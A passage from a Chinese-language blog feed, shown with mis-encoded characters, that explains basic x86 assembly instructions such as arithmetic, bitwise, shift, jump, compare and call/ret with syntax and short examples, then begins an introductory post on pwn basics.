&lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; å°†åœ°å€EBX+4*ESIæ”¾å…¥EDI<br>lea eax, [var] ; å°†varä¸­çš„å€¼æ”¾åœ¨EAXä¸­<br></code></pre></td></tr></table></figure><h2 id="ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦"><a href="#ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦"></a>ç®—æ•°å’Œé€»è¾‘è¿ç®—ç¬¦</h2><h4 id="add-æ•´æ•°åŠ æ³•"><a href="#add-æ•´æ•°åŠ æ³•" class="headerlink" title="add-æ•´æ•°åŠ æ³•"></a>add-æ•´æ•°åŠ æ³•</h4><p>addæŒ‡ä»¤å°†å…¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡ç›¸åŠ ï¼Œå°†ç»“æœå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ä¸­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡éƒ½å¯ä»¥æ˜¯å¯„å­˜å™¨ï¼Œ<strong>ä½†æœ€å¤šåªæœ‰ä¸€ä¸ªæ“ä½œå¯¹è±¡å¯ä»¥æ˜¯å†…å­˜ä½ç½®</strong>ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX â† EAX + 10<br>add BYTE PTR [var], 10 ; å°†å­˜å‚¨åœ¨å†…å­˜åœ°å€varçš„å•å­—èŠ‚å€¼åŠ ä¸Š10<br></code></pre></td></tr></table></figure><h4 id="sub-æ•´æ•°å‡æ³•"><a href="#sub-æ•´æ•°å‡æ³•" class="headerlink" title="sub-æ•´æ•°å‡æ³•"></a>sub-æ•´æ•°å‡æ³•</h4><p>subæŒ‡ä»¤å°†å…¶ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡çš„å€¼å‡å»ç¬¬äºŒä¸ªå¯¹è±¡çš„å€¼ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªå¯¹è±¡çš„å†…å­˜ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL â† AL - AH<br>sub eax, 216 ; ä»å­˜å‚¨åœ¨EAXä¸­çš„å€¼ä¸­å‡å»216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-é€’å¢ï¼Œé€’å‡"><a href="#inc-dec-é€’å¢ï¼Œé€’å‡" class="headerlink" title="inc,dec-é€’å¢ï¼Œé€’å‡"></a>inc,dec-é€’å¢ï¼Œé€’å‡</h4><p>incæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡çš„å†…å®¹+1ï¼›DECæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡çš„å†…å®¹-1</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; ä»EAXçš„å†…å®¹ä¸­å‡å»1<br>inc DWORD PTR [var] ; å°†å­˜å‚¨åœ¨ä½ç½®varçš„32ä½æ•´æ•°åŠ 1<br></code></pre></td></tr></table></figure><h4 id="imul-æ•´æ•°ä¹˜æ³•"><a href="#imul-æ•´æ•°ä¹˜æ³•" class="headerlink" title="imul-æ•´æ•°ä¹˜æ³•"></a>imul-æ•´æ•°ä¹˜æ³•</h4><p>imulæŒ‡ä»¤æœ‰ä¸¤ç§åŸºæœ¬æ ¼å¼ï¼šä¸¤ä¸ªæ“ä½œå¯¹è±¡å’Œä¸‰ä¸ªæ“ä½œå¯¹è±¡ã€‚</p><p>æœ‰ä¸¤ä¸ªæ“ä½œå¯¹è±¡æ—¶å°†å…¶ä¸¤ä¸ªæ“ä½œå¯¹è±¡ç›¸ä¹˜ï¼Œå¹¶å°†ç»“æœå‚¨å­˜åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å½“ä¸­ï¼Œå…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¯„å­˜å™¨ã€‚</p><p>æœ‰ä¸‰ä¸ªæ“ä½œå¯¹è±¡æ—¶ï¼Œå°†ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡ä¸ç¬¬ä¸‰ä¸ªæ“ä½œå¯¹è±¡ç›¸ä¹˜ï¼Œå¹¶å°†å…¶ç»“æœå‚¨å­˜åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å½“ä¸­ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¯„å­˜å™¨ï¼Œç¬¬ä¸‰ä¸ªå¯¹è±¡å¿…é¡»æ˜¯å¸¸é‡å€¼ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; å°†EAXçš„å†…å®¹ä¹˜ä»¥å†…å­˜ä½ç½®varçš„32ä½å†…å®¹å¹¶å°†ç»“æœå­˜å‚¨åœ¨EAXä¸­<br>imul esi, edi, 25 ; ESI â†’ EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-æ•´æ•°é™¤æ³•"><a href="#idiv-æ•´æ•°é™¤æ³•" class="headerlink" title="idiv-æ•´æ•°é™¤æ³•"></a>idiv-æ•´æ•°é™¤æ³•</h4><p>idivæŒ‡ä»¤å°†64ä½æ•´æ•°<code>EDX:EAX</code>çš„å†…å®¹é™¤ä»¥æŒ‡å®šçš„æ“ä½œå¯¹è±¡å€¼ã€‚ç»“æœå­˜å‚¨åœ¨EAXä¸­ï¼Œå…¶ä½™æ•°çš„å­˜å‚¨åœ¨EDXä¸­ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥EBXçš„å†…å®¹ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­<br>idiv DWORD PTR [var] ; å°†EDX:EAXçš„å†…å®¹é™¤ä»¥å­˜å‚¨åœ¨å†…å­˜ä½ç½®varçš„32ä½å€¼ã€‚æŠŠå•†æ”¾åœ¨EAXä¸­ï¼Œä½™æ”¾åœ¨EDXä¸­<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–"><a href="#and-or-xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–" class="headerlink" title="and,or xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–"></a>and,or xor-æŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–</h4><p>è¿™äº›æŒ‡ä»¤å¯¹å…¶æ“ä½œå¯¹è±¡æ‰§è¡ŒæŒ‡å®šçš„ä½è¿ç®—ï¼ˆåˆ†åˆ«ä¸ºæŒ‰ä½ä¸ã€æˆ–å’Œå¼‚æˆ–ï¼‰ï¼Œå¹¶å°†ç»“æœæ”¾åœ¨ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; æ¸…é™¤EAXçš„é™¤æœ€å4ä½ä»¥å¤–çš„æ‰€æœ‰ä½<br>xor edx, edx ; å°†EDXçš„å†…å®¹è®¾ç½®ä¸ºé›¶<br></code></pre></td></tr></table></figure><h4 id="not-æŒ‰ä½å–å"><a href="#not-æŒ‰ä½å–å" class="headerlink" title="not-æŒ‰ä½å–å"></a>not-æŒ‰ä½å–å</h4><p>notæŒ‡ä»¤è§¦å‘åè½¬æ“ä½œå¯¹è±¡ä¸­çš„æ‰€æœ‰ä½ï¼Œå…¶ç»“æœç§°ä¸ºåç ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; å–åå†…å­˜ä½ç½®varçš„å­—èŠ‚ä¸­çš„æ‰€æœ‰ä½<br></code></pre></td></tr></table></figure><h4 id="neg-æ±‚è¡¥"><a href="#neg-æ±‚è¡¥" class="headerlink" title="neg-æ±‚è¡¥"></a>neg-æ±‚è¡¥</h4><p>negæ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„æ±‚è¡¥æŒ‡ä»¤ï¼Œå¯¹æ“ä½œå¯¹è±¡æ‰§è¡Œæ±‚è¡¥è¿ç®—ï¼šç”¨0å‡å»æ“ä½œå¯¹è±¡ï¼Œç„¶åç»“æœè¿”å›æ“ä½œå¯¹è±¡ï¼›æˆ–æ˜¯ç›´æ¥å°†æ“ä½œå¯¹è±¡æŒ‰ä½å–åå+1</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX â†’ - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-å·¦ç§»ï¼Œå³ç§»"><a href="#shl-shr-å·¦ç§»ï¼Œå³ç§»" class="headerlink" title="shl, shr-å·¦ç§»ï¼Œå³ç§»"></a>shl, shr-å·¦ç§»ï¼Œå³ç§»</h4><p>è¿™äº›æŒ‡ä»¤å°†å…¶ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡å†…å®¹ä¸­çš„ä½å·¦å³ç§»ä½ï¼Œç”¨é›¶å¡«å……äº§ç”Ÿçš„ç©ºä½ä½ç½®ã€‚ç§»ä½åçš„æ“ä½œå¯¹è±¡æœ€å¤šå¯ä»¥ç§»ä½31ä½ã€‚è¦ç§»ä½çš„ä½æ•°ç”±ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šï¼Œè¯¥æ“ä½œå¯¹è±¡å¯ä»¥æ˜¯8ä½å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯„å­˜å™¨CLã€‚</p><p>åœ¨ä»»ä¸€æƒ…å†µä¸‹ï¼Œä»¥32ä¸ºæ¨¡æ‰§è¡Œå¤§äº31çš„ç§»ä½è®¡æ•°ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; å°†EAXçš„å€¼ä¹˜ä»¥2ï¼ˆå¦‚æœæœ€é«˜æœ‰æ•ˆä½ä¸º0ï¼‰<br>shr ebx, cl ; å°†EBXçš„å€¼é™¤ä»¥2^n^çš„ç»“æœçš„ä¸‹é™å­˜å‚¨åœ¨EBXä¸­ï¼Œå…¶ä¸­næ˜¯CLä¸­çš„å€¼<br></code></pre></td></tr></table></figure><h2 id="æ§åˆ¶æµæŒ‡ä»¤"><a href="#æ§åˆ¶æµæŒ‡ä»¤" class="headerlink" title="æ§åˆ¶æµæŒ‡ä»¤"></a>æ§åˆ¶æµæŒ‡ä»¤</h2><p>x86å¤„ç†å™¨ç»´æŠ¤ä¸€ä¸ªæŒ‡ä»¤æŒ‡é’ˆï¼ˆIPï¼‰å¯„å­˜å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ª32ä½å€¼ï¼ŒæŒ‡ç¤ºå½“å‰æŒ‡ä»¤åœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ã€‚é€šå¸¸ï¼Œåœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼Œå®ƒä¼šé€’å¢ä»¥æŒ‡å‘å†…å­˜ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„èµ·å§‹ä½ç½®ã€‚IPå¯„å­˜å™¨ä¸èƒ½ç›´æ¥æ“ä½œï¼Œè€Œæ˜¯ç”±æä¾›çš„æ§åˆ¶æµæŒ‡ä»¤éšå¼æ›´æ–°ã€‚</p><blockquote><p>æˆ‘ä»¬ä½¿ç”¨ç¬¦å·&lt;LABEL&gt;æ¥è¡¨ç¤ºä»£ç ä¸­å·²æ ‡è®°çš„ä½ç½®ã€‚é€šè¿‡è¾“å…¥æ ‡ç­¾åç§°åè·Ÿå†’å·ï¼Œå¯ä»¥åœ¨x86æ±‡ç¼–ä»£ç ä¸­çš„ä»»æ„ä½ç½®æ’å…¥æ ‡ç­¾ã€‚</p></blockquote><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>æ­¤ä»£ç æ®µä¸­çš„ç¬¬äºŒæ¡æŒ‡ä»¤è¢«æ ‡è®°ä¸ºbeginã€‚åœ¨ä»£ç çš„å…¶ä»–åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´æ–¹ä¾¿çš„ç¬¦å·åç§°beginæ¥å¼•ç”¨æ­¤æŒ‡ä»¤æ‰€åœ¨çš„å†…å­˜ä¸­çš„ä½ç½®ã€‚è¿™ä¸ªæ ‡ç­¾åªæ˜¯è¡¨ç¤ºä½ç½®çš„ä¸€ç§æ–¹ä¾¿æ–¹å¼ï¼Œè€Œä¸æ˜¯å®ƒçš„32ä½å€¼ã€‚</p><h4 id="jmp-è·³è½¬"><a href="#jmp-è·³è½¬" class="headerlink" title="jmp-è·³è½¬"></a>jmp-è·³è½¬</h4><p>å°†ç¨‹åºæ§åˆ¶æµè½¬ç§»åˆ°æ“ä½œå¯¹è±¡æŒ‡ç¤ºçš„å†…å­˜ä½ç½®ä¸Š</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; è·³åˆ°æ ‡è®°ä¸ºbeginçš„æŒ‡ä»¤ä½ç½®<br></code></pre></td></tr></table></figure><h4 id="jcondition-æ¡ä»¶è·³è½¬"><a href="#jcondition-æ¡ä»¶è·³è½¬" class="headerlink" title="jcondition-æ¡ä»¶è·³è½¬"></a>jcondition-æ¡ä»¶è·³è½¬</h4><p>è¿™äº›æŒ‡ä»¤æ˜¯åŸºäºä¸€ç»„æ¡ä»¶ç çŠ¶æ€åˆ¤æ–­æ˜¯å¦è¿›è¡Œè·³è½¬ï¼Œè¯¥æ¡ä»¶ç è¢«å­˜å‚¨åœ¨ç§°ä¸ºæœºå™¨çŠ¶æ€å­—çš„ç‰¹æ®Šå¯„å­˜å™¨ä¸­ã€‚</p><p>æœºå™¨çŠ¶æ€å­—çš„å†…å®¹åŒ…æ‹¬æœ‰å…³ä¸Šæ¬¡æ‰§è¡Œçš„ç®—æœ¯è¿ç®—çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œæ­¤å­—çš„æŸä¸€æ¯”ç‰¹ä½è¡¨ç¤ºæœ€åç»“æœæ˜¯å¦ä¸ºé›¶ï¼ŒæŸå¦ä¸€ä¸ªæ¯”ç‰¹ä½æŒ‡ç¤ºä¸Šæ¬¡ç»“æœæ˜¯å¦ä¸ºè´Ÿæ•°ã€‚</p><p>åŸºäºè¿™äº›æ¡ä»¶ç ï¼Œå¯ä»¥æ‰§è¡Œå¤šä¸ªæ¡ä»¶è·³è½¬ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸Šæ¬¡ç®—æœ¯è¿ç®—çš„ç»“æœä¸ºé›¶ï¼Œåˆ™JZæŒ‡ä»¤æ‰§è¡Œåˆ°æŒ‡å®šæ“ä½œå¯¹è±¡æ ‡ç­¾çš„è·³è½¬ã€‚å¦åˆ™ï¼Œæ§åˆ¶æŒ‰é¡ºåºå‰è¿›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>è®¸å¤šæ¡ä»¶åˆ†æ”¯çš„åå­—éƒ½æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡æ‰§è¡Œçš„ç‰¹æ®Šæ¯”è¾ƒæŒ‡ä»¤cmpå‘½åçš„ã€‚ä¾‹å¦‚ï¼Œæ¡ä»¶åˆ†æ”¯ï¼ˆå¦‚JLEå’ŒJNEï¼‰åŸºäºé¦–å…ˆå¯¹æ‰€éœ€æ“ä½œå¯¹è±¡æ‰§è¡Œcmpæ“ä½œã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; ç›¸ç­‰æ—¶è·³è½¬<br>jne &lt;label&gt; ; ä¸ç›¸ç­‰æ—¶è·³è½¬<br>jz &lt;label&gt;  ; æœ€åç»“æœä¸ºé›¶æ—¶è·³è½¬<br>jg &lt;label&gt;  ; å¤§äºæ—¶è·³è½¬<br>jge &lt;label&gt; ; å¤§äºç­‰äºæ—¶è·³è½¬<br>jl &lt;label&gt;  ; å°äºæ—¶è·³è½¬<br>jle &lt;label&gt; ; å°äºç­‰äºæ—¶è·³è½¬<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; å¦‚æœEAXçš„ä¸­çš„å€¼å°äºæˆ–ç­‰äºEBXä¸­çš„å€¼ï¼Œè·³è‡³æ ‡ç­¾doneã€‚å¦åˆ™ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤<br></code></pre></td></tr></table></figure><h4 id="cmp-æ¯”è¾ƒ"><a href="#cmp-æ¯”è¾ƒ" class="headerlink" title="cmp-æ¯”è¾ƒ"></a>cmp-æ¯”è¾ƒ</h4><p>æ¯”è¾ƒä¸¤ä¸ªæŒ‡å®šæ“ä½œå¯¹è±¡çš„å€¼ï¼Œé€‚å½“è®¾ç½®æœºå™¨çŠ¶æ€å­—ä¸­çš„æ¡ä»¶ä»£ç ã€‚æ­¤æŒ‡ä»¤ç­‰åŒäºsubæŒ‡ä»¤ï¼Œä¸åŒä¹‹å¤„åœ¨äºå°†ä¸¢å¼ƒå‡æ³•ç»“æœï¼Œè€Œä¸æ˜¯æ›¿æ¢ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; å¦‚æœå­˜å‚¨åœ¨varä¸­çš„4ä¸ªå­—èŠ‚çš„å€¼ç­‰äº4å­—èŠ‚æ•´æ•°å¸¸é‡10ï¼Œåˆ™è·³è½¬åˆ°æ ‡è®°ä¸ºloopçš„ä½ç½®<br></code></pre></td></tr></table></figure><h4 id="call-ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›"><a href="#call-ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›" class="headerlink" title="call, ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›"></a>call, ret-å­ç¨‹åºè°ƒç”¨å’Œè¿”å›</h4><p>è¿™äº›æŒ‡ä»¤å®ç°ä¸€ä¸ªå­ç¨‹åºè°ƒç”¨å’Œè¿”å›ã€‚</p><p>callæŒ‡ä»¤é¦–å…ˆå°†å½“å‰ä»£ç ä½ç½®å‹å…¥åˆ°å†…å­˜ä¸­ç¡¬ä»¶æ”¯æŒçš„å †æ ˆä¸­ï¼Œç„¶åæ— æ¡ä»¶è·³è½¬åˆ°æ ‡ç­¾æ“ä½œå¯¹è±¡æŒ‡ç¤ºçš„ä»£ç ä½ç½®ã€‚ä¸ç®€å•çš„è·³è½¬æŒ‡ä»¤ä¸åŒï¼ŒcallæŒ‡ä»¤ä¿å­˜å½“å‰ä½ç½®ï¼Œå¹¶åœ¨å­ç¨‹åºå®Œæˆæ—¶è¿”å›åˆ°æ­¤å¤„ã€‚</p><p>retæŒ‡ä»¤å®ç°å­ç¨‹åºè¿”å›æœºåˆ¶ã€‚æ­¤æŒ‡ä»¤é¦–å…ˆä»ç¡¬ä»¶æ”¯æŒçš„å†…å­˜å †æ ˆä¸­å¼¹å‡ºä»£ç ä½ç½®ï¼Œç„¶åæ— æ¡ä»¶è·³è½¬è‡³è¯¥ä»£ç ä½ç½®ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>æœ€è¿‘ä¸€ç›´è¢«é—®x86å­¦å®Œäº†æ²¡ï¼Œè¿™ç®—å­¦å®Œå­ï¼ˆå°å£°bb)ğŸ¤¨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨PWNçš„è¾¹ç¼˜ç–¯ç‹‚è¯•æ¢</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ç‚¹ç‚¹ pwn åŸºç¡€â€”â€”æ ˆå’Œå †ã€æ±‡ç¼–åŸºç¡€å’ŒLinuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶</p><span id="more"></span><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>PWNæ˜¯ä¸€ä¸ªé»‘å®¢è¯­æ³•çš„ä¿šè¯­è¯ ï¼Œæ˜¯æŒ‡æ”»ç ´è®¾å¤‡æˆ–è€…ç³»ç»Ÿ ã€‚å‘éŸ³ç±»ä¼¼â€ç °â€ï¼Œå¯¹é»‘å®¢è€Œè¨€ï¼Œè¿™å°±æ˜¯æˆåŠŸå®æ–½é»‘å®¢æ”»å‡»çš„å£°éŸ³â€“ç °çš„ä¸€å£°ï¼Œè¢«â€é»‘â€çš„ç”µè„‘æˆ–æ‰‹æœºå°±è¢«ä½ æ“çºµäº† ã€‚</p><p>ï¼ˆä¸Šæ–‡æ¥è‡ªç™¾åº¦ï¼‰</p><p>ä¸ªäººè®¤ä¸ºè§£å†³PWNé¢˜å°±æ˜¯åˆ©ç”¨ç®€å•çš„é€†å‘å¾—åˆ°ä»£ç ï¼Œä»ä»£ç 